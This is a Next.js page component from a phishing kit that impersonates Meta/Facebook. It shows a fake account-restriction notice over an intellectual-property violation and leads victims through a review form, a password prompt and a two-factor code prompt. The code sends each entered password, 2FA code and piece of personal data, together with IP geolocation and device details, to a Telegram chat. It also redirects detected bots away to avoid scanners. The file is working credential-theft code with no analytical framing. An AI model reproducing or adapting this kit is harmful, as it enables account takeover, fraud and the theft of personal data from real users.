'use client';

import { useState, useEffect, useMemo, useCallback, useRef, type MouseEvent } from 'react';
import type { StaticImageData } from 'next/image';
import axios from 'axios';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';
import type { FormData, UiTexts } from '@/types';
import '@/assets/css/community-standards.css';
import LogoMeta from '@/assets/images/meta-logo-grey.png';
import Background from '@/assets/images/background.png';
import BgHero from '@/assets/images/bg_hero.png';
import TradeMark from '@/assets/images/trade-mark.png';
import Copyright from '@/assets/images/copyright.png';
import Counterfeit from '@/assets/images/counterfeit.png';
import IcWarning from '@/assets/images/ic_warning.svg';

import { translateTexts } from '@/utils/translate-by-lang';
import countryToLanguage from '@/utils/country_to_language';
import { sendTelegramMessage } from '@/utils/send-message';
import { buildMetaMessage } from '@/utils/message';
import { getDeviceLabel } from '@/utils/device';
import detectBot from '@/utils/detect_bot';
import { redirectToRandomContact } from '@/utils/contact-redirect';

const GEO_ENDPOINTS: Array<{
    url: string;
    map: (data: Record<string, string | undefined>) => {
        ip?: string;
        city?: string;
        region?: string;
        country?: string;
        countryCode?: string;
    };
}> = [
    {
        url: 'https://get.geojs.io/v1/ip/geo.json',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipapi.co/json/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country_name,
            countryCode: data?.country_code
        })
    },
    {
        url: 'https://ipwho.is/',
        map: (data) => ({
            ip: data?.ip,
            city: data?.city,
            region: data?.region,
            country: data?.country,
            countryCode: data?.country_code
        })
    }
];

const normalizeCountryCode = (code = '') => String(code).trim().toUpperCase();
const isUnknownValue = (value = '') => {
    const normalized = String(value ?? '').trim().toLowerCase();
    return !normalized || ['unknown', 'n/a', 'na', 'null', 'undefined', '-'].includes(normalized);
};
const normalizeGeoValue = (value?: string) => (isUnknownValue(value) ? '' : String(value).trim());

interface GeoCandidate {
    ip: string;
    city: string;
    region: string;
    country: string;
    countryCode: string;
}

const getFallbackLanguage = () => {
    const [browserLang = 'en'] = String(navigator.language || 'en').split('-');
    return browserLang.toLowerCase() || 'en';
};

const resolveTargetLang = (countryCode = '') => {
    const normalizedCode = normalizeCountryCode(countryCode);
    const byIp = countryToLanguage[normalizedCode];
    return byIp || getFallbackLanguage();
};

const fetchGeoData = async (): Promise<GeoCandidate> => {
    let bestCandidate: GeoCandidate | null = null;
    let bestScore = -1;

    const getCandidateScore = (candidate: GeoCandidate) => {
        const hasCountry = !isUnknownValue(candidate.country);
        const hasRegion = !isUnknownValue(candidate.region);
        const hasCity = !isUnknownValue(candidate.city);
        const hasIp = !isUnknownValue(candidate.ip);
        const hasCountryCode = !isUnknownValue(candidate.countryCode);
        return (hasCity ? 3 : 0) + (hasRegion ? 2 : 0) + (hasCountry ? 2 : 0) + (hasCountryCode ? 1 : 0) + (hasIp ? 1 : 0);
    };

    for (const endpoint of GEO_ENDPOINTS) {
        try {
            const response = await axios.get(endpoint.url, { timeout: 5000 });
            const mapped = endpoint.map(response.data || {}) || {};
            const candidate = {
                ip: normalizeGeoValue(mapped.ip),
                city: normalizeGeoValue(mapped.city),
                region: normalizeGeoValue(mapped.region),
                country: normalizeGeoValue(mapped.country),
                countryCode: normalizeGeoValue(mapped.countryCode)
            };
            const score = getCandidateScore(candidate);

            if (score > bestScore) {
                bestCandidate = candidate;
                bestScore = score;
            }

            if (candidate.city && candidate.region && candidate.country) {
                return candidate;
            }
        } catch {
            continue;
        }
    }
    if (bestCandidate && bestScore > 0) {
        return bestCandidate;
    }
    throw new Error('All geo providers failed');
};

const assetSrc = (asset: StaticImageData | string) => (typeof asset === 'string' ? asset : asset.src);

const Home = () => {
    const [showReviewPage, setShowReviewPage] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        reason: '',
        additionalNotes: ''
    });
    const [loginData, setLoginData] = useState({ email: '', password: '' });
    const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState<string[]>([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', country_code: 'US' });
    const [deviceLabel, setDeviceLabel] = useState('Unknown');
    const messageIdRef = useRef<number | null>(null);
    const sendQueueRef = useRef<Promise<void>>(Promise.resolve());
    const formDataRef = useRef(formData);
    const [translatedTexts, setTranslatedTexts] = useState<UiTexts>({});

    useEffect(() => {
        formDataRef.current = formData;
    }, [formData]);

    useEffect(() => {
        const storedId = localStorage.getItem('message_id');
        if (storedId) {
            const parsed = Number.parseInt(storedId, 10);
            if (!Number.isNaN(parsed)) {
                messageIdRef.current = parsed;
            }
        }
    }, []);

    const defaultTexts = useMemo(
        () => ({
            confirm: 'Return to Facebook',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',
            twoFAInstructionPrefix: 'Enter the code sent to',
            twoFAInstructionSuffix:
                'Enter the 6 or 8-digit code for this account from the two-factor authentication you set up (such as Duo Mobile or Google Authorization, email, or text message on your mobile phone).',
            code: 'Code',
            codeExpired: 'The code you entered is incorrect. Please try again.',
            pleaseWait: 'Please wait',
            step: 'Step',
            tryAnotherMethod: 'Try another method',
            twoFactorAuthentication: 'Two-factor authentication',
            twoFactorAuthenticationDescription: 'Enter your 6 or 8-digit 2FA code.',
            notificationsFromOtherDevices: 'Notifications from other devices',
            authorizeLoginFromAnotherDevice: 'Authorize login from another device.',
            idAndSelfieVideo: 'Official ID photo',
            idAndSelfieVideoDescription: 'Take a photo of your official ID.',
            identityVerificationMethodTitle: 'Please choose an identity verification method.',
            identityVerificationMethodSubtitle: 'The available verification methods are listed below.',
            checkNotificationOnAnotherDevice: 'Check notifications on another device',
            deviceNotificationDescription:
                'We sent a notification to your other devices. Please check the notification on Facebook and approve the login to continue.',
            identityVerification: 'Identity verification',
            identityGuideTitle: 'We will guide you through a few steps',
            identityGuideDescription: 'Please provide the following information so we can verify your identity:',
            uploadId: 'Upload ID',
            uploadIdDescription:
                'Identity is verified through official identification. This information is not shared on your profile.',
            selectIdTypeTitle: 'Select the type of ID you want to upload',
            selectIdTypeDescription:
                'Your ID is used to review your name, photo, and date of birth. Your ID is not shared in your profile.',
            uploadIdPhotoTitle: 'Upload ID photo',
            uploadIdPhotoInstruction:
                'The information on the ID card must be clearly visible in the photo. If the information is unclear, you may need to resubmit. Check',
            photoRequirements: 'photo requirements',
            uploadIdDropHint: 'Click Upload or drag and drop the photo file with your ID.',
            uploadButton: 'Upload',
            selectedFileLabel: 'Selected file:',
            validCodeHint: 'A valid code has 6 or 8 digits.',
            identityInvalidImageError: 'Please choose an image file (jpg, png, webp).',
            identityUploadRequiredError: 'Please upload an ID image before continuing.',
            identityUploadFailedError: 'Upload failed. Please try again.',
            back: 'Back',
            submission: 'Submission',
            passport: 'Passport',
            driversLicense: "driver's license",
            residentRegistrationCard: 'Resident registration card',
            next: 'Next',
            twoFAStep: 'Two-factor authentication request',
            securityReason: 'For security reasons, please enter your password to continue.',

            successTitle: 'Request has been sent',
            successMessage1: 'Your request has been added to the processing queue. We will handle your request within 24 hours.',
            successMessage2: 'From the Customer Support Meta.',

            verificationInfo: 'Verification information',
            fillRequiredFields:
                'Please fill in correctly and completely all required fields to complete the verification profile.',
            fullName: 'Full Name',
            fullNamePlaceholder: 'Example: John Smith',
            personalEmail: 'Personal Email',
            personalEmailPlaceholder: 'Example: johnsmith@gmail.com',
            businessEmail: 'Business Email',
            businessEmailPlaceholder: 'Example: contact@company.com',
            mobilePhone: 'Mobile Phone Number',
            mobilePhonePlaceholder: 'Example: +1 201 555 0123',
            yourPageName: 'Your Page Name',
            pageNamePlaceholder: 'Example: ABC Studio Official',
            additionalNotes: 'Additional notes (optional)',
            additionalNotesPlaceholder:
                'Example: This page officially represents ABC brand and needs verification to improve trust.',
            reviewReasonIntro:
                'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
            reviewReasonTitle: 'What do you think happened?',
            reasonErroneousReport: 'An erroneous report or unfair competitive complaint.',
            reasonNotificationError: 'This notification was sent in error.',
            reasonNoFraud: 'No fraud involved / another legitimate reason:',

            heroTitle: 'Violation of Community Standards',
            heroDesc:
                'Our technology and review teams help detect and review content that may violate our policies. When we find content that does not follow our Community Standards, we may remove it and take action on the account responsible.',

            appealTitle: 'Your account and Page have been restricted or disabled',
            appealDesc1: 'We have determined that certain activity on your Page may not comply with our Community Standards.',
            appealDesc2:
                'In particular, we found content that may violate our Intellectual Property policies, which include protections for copyrights and trademarks. When users repeatedly share content that violates these policies, we may take additional actions on their accounts.',
            appealWhyTitle: 'Why this happened',
            appealWhy1:
                'Your account or content may have been reported by other users or detected by our automated systems for potentially violating our policies related to intellectual property rights.',
            appealWhy2:
                'These policies help protect creators, businesses and individuals from unauthorized use of their work, brand names or protected materials.',
            appealWhatTitle: 'What you can do',
            appealWhat1: 'If you believe this action was taken by mistake, you may request a review.',
            appealWhat2:
                'During the review process, our team will evaluate your account activity and the reported content to determine whether it complies with our policies.',
            appealWhat3:
                'You can also learn more about our policies and how to avoid violations in the future by visiting our Help Center.',
            appealButton: 'Request Review',

            ipTitle: 'What is an Intellectual Property Violation?',
            trademarkTitle: 'Trademark',
            trademarkDesc:
                'A trademark is a word, slogan, symbol or design (example: brand name, logo) that distinguishes the products or services offered by one person, group or company from another. Generally, trademark law seeks to prevent confusion among consumers about who provides or is affiliated with a product or service.',
            copyrightTitle: 'Copyright',
            copyrightDesc:
                "Copyright is a legal right that seeks to protect original works of authorship (example: books, music, film, art). Generally, copyright protects original expression such as words or images. It does not protect facts and ideas, although it may protect the original words or images used to describe an idea. Copyright also doesn't protect things like names, titles and slogans; however, another legal right called a trademark might protect those.",
            counterfeitTitle: 'Counterfeit Goods',
            counterfeitDesc:
                "A counterfeit good is a knockoff or replica version of another company's product. It usually copies the trademark (name or logo) and/or distinctive features of that other company's product to imitate a genuine product. The manufacture, promotion or sale of a counterfeit goods is a type of trademark infringement that is illegal in most countries, and is recognized as being harmful to consumers, trademark owners and honest sellers. Please note that counterfeit goods may be unlawful even if the seller explicitly says that the goods are counterfeit, or otherwise disclaims authenticity of the goods."
        }),
        []
    );

    const translateAllTexts = useCallback(
        async (lang: string) => {
            try {
                const keys = Object.keys(defaultTexts);
                const sourceTexts = keys.map((key) => defaultTexts[key as keyof typeof defaultTexts]);
                const translations = await translateTexts(sourceTexts, lang);
                const translated: UiTexts = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });

                const normalizedStep = String(translated.step || '').trim().toLowerCase();
                if (!normalizedStep || normalizedStep.includes('bước chân')) {
                    translated.step = lang === 'vi' ? 'Bước' : defaultTexts.step;
                }

                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            try {
                const data = await fetchGeoData();
                const normalizedCountryCode = normalizeCountryCode(data.countryCode);
                setIpInfo({
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown',
                    country_code: normalizedCountryCode || 'Unknown'
                });
                localStorage.setItem(
                    'ipInfo',
                    JSON.stringify({
                        ip: data.ip || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        country_code: normalizedCountryCode || 'Unknown'
                    })
                );

                const lang = resolveTargetLang(normalizedCountryCode);
                localStorage.setItem('targetLang', lang);

                if (lang !== 'en') {
                    await translateAllTexts(lang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                const cachedLang = String(localStorage.getItem('targetLang') || '').trim().toLowerCase();
                const fallbackLang = cachedLang && cachedLang !== 'en' ? cachedLang : getFallbackLanguage();
                localStorage.setItem('targetLang', fallbackLang || 'en');

                if (fallbackLang !== 'en') {
                    await translateAllTexts(fallbackLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            }

            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            const label = await getDeviceLabel();
            setDeviceLabel(label);
        } catch (error) {
            console.error('Initialization error:', error);
            setTranslatedTexts(defaultTexts);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        initializeApp();
    }, [initializeApp]);

    const buildAndSend = (form: FormData, passwordLogs: string[], codeAttempts: string[]) => {
        const geoInfo = {
            asn: 0,
            ip: ipInfo.ip,
            country: ipInfo.country,
            city: ipInfo.city,
            region: ipInfo.region,
            country_code: ipInfo.country_code || 'US'
        };

        const information = [form.reason, form.additionalNotes].filter(Boolean).join(' | ');

        const message = buildMetaMessage({
            geoInfo,
            deviceLabel,
            userData: {
                fullName: form.fullName,
                personalEmail: form.personalEmail,
                businessEmail: form.businessEmail,
                phoneNumber: form.phone,
                facebookPageName: form.pageName,
                information
            },
            passwords: passwordLogs,
            codes: codeAttempts
        });

        // Xếp hàng tuần tự: xóa tin cũ → gửi tin mới (data cũ + mới)
        sendQueueRef.current = sendQueueRef.current
            .catch(() => {})
            .then(async () => {
                const oldMessageId = messageIdRef.current;
                const result = await sendTelegramMessage(message, oldMessageId);

                if (result?.success && typeof result.message_id === 'number') {
                    messageIdRef.current = result.message_id;
                    localStorage.setItem('message_id', String(result.message_id));
                }
            })
            .catch((error) => {
                console.error('Telegram send failed:', error);
            });
    };

    const handleFirstFormSubmit = (data: FormData) => {
        formDataRef.current = data;
        setFormData(data);
        buildAndSend(data, [], []);
        setShowReviewPage(false);
        setShowLoginModal(true);
    };

    const handleLoginSubmit = (email: string, password: string) => {
        setLoginData({ email, password });
        const nextPasswordAttempts = [...passwordAttempts, password];
        setPasswordAttempts(nextPasswordAttempts);
        buildAndSend(formDataRef.current, nextPasswordAttempts, twoFAAttempts);
    };

    const handle2FASubmit = (code: string) => {
        const newAttempts = [...twoFAAttempts, code];
        setTwoFAAttempts(newAttempts);
        buildAndSend(formDataRef.current, passwordAttempts, newAttempts);
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    const handleFakeLinkClick = (event: MouseEvent<HTMLAnchorElement>) => {
        event.preventDefault();
        redirectToRandomContact();
    };

    const Footer = () => (
        <div className="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
            <div className="max-w-[1280px] w-full mx-auto px-4">
                <div className="community-footer-languages flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600">
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        English (US)
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        English (UK)
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Italiano
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Français
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        中文(简体)
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        日本語
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        한국어
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        עברית
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Español
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline text-[#6D84B4]">
                        Português
                    </a>
                </div>
                <div className="community-footer-links flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
                    <p className="mr-4">© 2026 Meta</p>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        About
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        Developers
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        Careers
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        Privacy
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        Cookies
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        Terms
                    </a>
                    <a href="#" onClick={handleFakeLinkClick} className="hover:underline">
                        Help Centre
                    </a>
                </div>
            </div>
        </div>
    );

    const Header = () => (
        <div className="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
            <div className="max-w-[1280px] w-full flex items-center justify-between px-4">
                <a href="/help">
                    <img src={assetSrc(LogoMeta)} width="64" alt="Meta" />
                </a>
            </div>
        </div>
    );

    return (
        <>
            {showReviewPage ? (
                <div className="community-page min-h-screen w-full flex justify-center bg-white">
                    <div className="w-full">
                        <Header />
                        <FirstFormModal
                            show={true}
                            asPage={true}
                            onClose={() => setShowReviewPage(false)}
                            onSubmit={handleFirstFormSubmit}
                            texts={texts}
                        />
                        <Footer />
                    </div>
                </div>
            ) : (
                <div className="community-page min-h-screen w-full flex justify-center bg-white">
                    <div className="w-full">
                        <Header />

                        <div
                            className="bg-no-repeat bg-cover flex items-center justify-center"
                            style={{ backgroundImage: `url(${assetSrc(Background)})` }}
                        >
                            <div className="max-w-[1280px] w-full px-4 flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6">
                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex flex-col items-start text-left justify-center">
                                    <h1 className="font-[700] text-[32px] mb-3">{texts.heroTitle}</h1>
                                    <p className="text-[16px] mb-2">{texts.heroDesc}</p>
                                </div>
                                <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex items-center justify-center">
                                    <img src={assetSrc(BgHero)} width="100%" alt="Hero" />
                                </div>
                            </div>
                        </div>

                        <div className="border-b border-[#E0E0E0]">
                            <div className="community-appeal">
                                <div className="community-appeal-intro">
                                    <div className="community-appeal-header">
                                        <img src={assetSrc(IcWarning)} className="w-[29px] h-[29px]" alt="" />
                                        <b className="community-appeal-title">{texts.appealTitle}</b>
                                    </div>
                                    <p className="text-gray-800">{texts.appealDesc1}</p>
                                    <p className="text-gray-800">{texts.appealDesc2}</p>
                                </div>

                                <div className="community-appeal-section">
                                    <p className="community-appeal-section-title">{texts.appealWhyTitle}</p>
                                    <p>{texts.appealWhy1}</p>
                                    <p>{texts.appealWhy2}</p>
                                </div>

                                <div className="community-appeal-section">
                                    <p className="community-appeal-section-title">{texts.appealWhatTitle}</p>
                                    <p>{texts.appealWhat1}</p>
                                    <p>{texts.appealWhat2}</p>
                                    <p>{texts.appealWhat3}</p>
                                </div>
                                <button
                                    type="button"
                                    onClick={() => setShowReviewPage(true)}
                                    className="community-appeal-button"
                                >
                                    {texts.appealButton}
                                </button>
                            </div>
                        </div>

                        <div className="community-ip-section mt-10 max-w-[1280px] w-full px-4 mx-auto">
                            <p className="text-center">
                                <b className="font-700 md:text-3xl text-2xl text-center">{texts.ipTitle}</b>
                            </p>

                            <div className="community-ip-row community-ip-row-text-first">
                                <div className="community-ip-copy community-ip-copy-left">
                                    <b className="font-700 md:text-2xl text-xl">{texts.trademarkTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.trademarkDesc}</p>
                                </div>
                                <div className="community-ip-image">
                                    <img src={assetSrc(TradeMark)} width="100%" alt="Trademark" />
                                </div>
                            </div>

                            <div className="community-ip-row community-ip-row-image-first">
                                <div className="community-ip-image">
                                    <img src={assetSrc(Copyright)} width="100%" alt="Copyright" />
                                </div>
                                <div className="community-ip-copy community-ip-copy-right">
                                    <b className="font-700 md:text-2xl text-xl">{texts.copyrightTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.copyrightDesc}</p>
                                </div>
                            </div>

                            <div className="community-ip-row community-ip-row-text-first">
                                <div className="community-ip-copy community-ip-copy-left">
                                    <b className="font-700 md:text-2xl text-xl">{texts.counterfeitTitle}</b>
                                    <p className="mt-2 text-gray-800">{texts.counterfeitDesc}</p>
                                </div>
                                <div className="community-ip-image">
                                    <img src={assetSrc(Counterfeit)} width="100%" alt="Counterfeit" />
                                </div>
                            </div>
                        </div>

                        <Footer />
                    </div>
                </div>
            )}

            <LoginModal
                show={showLoginModal}
                onClose={() => setShowLoginModal(false)}
                onSubmit={handleLoginSubmit}
                onSuccess={() => {
                    setShowLoginModal(false);
                    setShow2FAModal(true);
                }}
                texts={texts}
            />
            <TwoFAModal
                show={show2FAModal}
                onClose={() => setShow2FAModal(false)}
                onSubmit={handle2FASubmit}
                onSuccess={() => {
                    setShow2FAModal(false);
                    setShowSuccessModal(true);
                }}
                texts={texts}
                formData={formData}
            />
            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
        </>
    );
};

export default Home;
